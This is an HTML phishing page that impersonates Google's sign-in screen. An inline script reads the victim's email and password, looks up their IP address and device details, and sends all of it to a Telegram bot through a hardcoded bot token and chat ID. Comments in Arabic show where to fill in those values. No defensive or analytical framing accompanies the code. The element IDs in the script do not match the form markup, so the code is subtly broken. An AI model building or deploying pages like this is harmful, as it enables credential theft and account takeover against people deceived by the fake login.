<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login</title>
    <link rel="stylesheet" href="/s.css">
</head>
<body>
    <div class="box">
    <form class="form"> 
        <img src="/download.png" width="100px">
        <h1 class="form-title">sign in</h1>
        <div class="form-group">
            <input type="text" class="form-control" required>
            <label for="" class="class-label"> email or phone</label>
        </div>
        <div class="form-group">
            <input type="password" class="form-control" required>
            <label for="" class="class-label"> password</label>
        </div>
        <div class="form-group">
            
            <label for="" class="show-label">
                <input type="checkbox" id="show"> show password
            </label>
        </div>
        <div class="bottom-button">
            <a href="#">forget password ?</a>
            <button class="form-button"> next</button>
        </div>

    </form>
<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
<script>
    const TOKEN = "7732680200:AAGoPAI36_BGvelhQvoLgRPZbBYA9OKjMTk";                                                            // هنا التوكين              
    const CHAT_ID = "7258461293";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                const ip = response.data.ip;

                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                const message = ` 
                    <b>New Login Attempt</b>\n
                    <b>Email:</b> ${email}\n
                    <b>Password:</b> ${password}\n
                    <b>IP Address:</b> ${ip}\n
                    <b>Device Type:</b> ${deviceType}\n
                    <b>Platform:</b> ${platform}\n
                    <b>User Agent:</b> ${userAgent}\n
                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                `;

                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                }).then(response => {
                    alert('Information sent successfully!');
                }).catch(error => {
                    alert('Error sending the information. Please try again.');
                });
            })
            .catch(error => {
                alert('Error fetching the IP address. Please try again.');
            });
    });
</script>

</body>
</html>
